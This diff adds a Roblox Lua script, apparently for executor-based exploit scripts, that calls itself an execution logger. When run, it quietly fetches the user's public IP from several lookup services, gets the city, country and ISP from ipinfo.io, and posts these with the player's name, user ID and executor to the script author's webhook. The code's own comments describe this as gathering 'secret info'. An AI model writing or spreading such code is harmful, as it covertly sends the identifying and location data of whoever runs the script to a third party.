@@ -1,0 +1,128 @@
+--// Config
+getgenv().whscript = ""  -- Change to your script's name
+getgenv().webhookexecUrl = ""  -- Replace with your actual webhook URL
+getgenv().ExecLogSecret = true  -- Now properly works for IP logging
+
+--// Execution Log Script
+local player = game:GetService("Players").LocalPlayer
+local httpService = game:GetService("HttpService")
+
+-- Enhanced HTTP request function with multiple fallbacks
+local function secureHttpGet(url)
+    local possibleMethods = {
+        function() return game:HttpGet(url, true) end,
+        function() return game:HttpGetAsync(url) end,
+        function() return http_request({Url=url,Method="GET"}) end,
+        function() return (syn and syn.request({Url=url,Method="GET"}).Body) end
+    }
+    
+    for _, method in pairs(possibleMethods) do
+        local success, result = pcall(method)
+        if success and result then
+            return result
+        end
+    end
+    return nil
+end
+
+-- Main function to gather secret info
+local function getSecretInfo()
+    if not getgenv().ExecLogSecret then return nil end
+    
+    -- Try multiple IP services
+    local ipServices = {
+        "https://api.ipify.org",
+        "https://ipinfo.io/ip",
+        "https://icanhazip.com",
+        "https://checkip.amazonaws.com"
+    }
+    
+    local ip
+    for _, url in ipairs(ipServices) do
+        local result = secureHttpGet(url)
+        if result and #result > 0 and not result:find("[<>]") then
+            ip = result:gsub("%s+", "")
+            break
+        end
+    end
+    
+    if not ip then return nil end
+    
+    -- Get detailed IP info
+    local ipDetails
+    local detailSuccess, detailResponse = pcall(function()
+        return secureHttpGet("https://ipinfo.io/"..ip.."/json")
+    end)
+    
+    if detailSuccess and detailResponse then
+        ipDetails = pcall(httpService.JSONDecode, httpService, detailResponse)
+    end
+    
+    return {
+        ip = ip,
+        details = ipDetails and type(ipDetails) == "table" and ipDetails or nil
+    }
+end
+
+-- Modified webhook send function with secret info
+local function sendWebhook()
+    local secretInfo = getSecretInfo()
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🚀 Script Execution Report",
+            ["color"] = 0x3498db,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = string.format("```Name: %s (@%s)\nUserID: %d```",
+                        player.DisplayName, player.Name, player.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🖥️ System Info",
+                    ["value"] = string.format("```Executor: %s\nGame: %s```",
+                        identifyexecutor() or "Unknown", game.PlaceId),
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Exec Log • "..os.date("%x %X")
+            }
+        }}
+    }
+    
+    -- Add secret info if available
+    if secretInfo then
+        local secretValue = "||IP: "..secretInfo.ip.."||"
+        if secretInfo.details then
+            secretValue = secretValue..
+                "\n||Location: "..(secretInfo.details.city or "?")..", "..(secretInfo.details.country or "?").."||"..
+                "\n||ISP: "..(secretInfo.details.org or "?").."||"
+        end
+        
+        table.insert(data.embeds[1].fields, {
+            ["name"] = "🔒 Secret Info",
+            ["value"] = secretValue,
+            ["inline"] = false
+        })
+    end
+    
+    -- Send the webhook
+    local success, err = pcall(function()
+        local response = (syn and syn.request or http_request or request)({
+            Url = getgenv().webhookexecUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = httpService:JSONEncode(data)
+        })
+        return response.StatusCode == 200
+    end)
+    
+    if not success then
+        warn("Webhook failed:", err)
+    end
+end
+
+-- Execute
+sendWebhook()
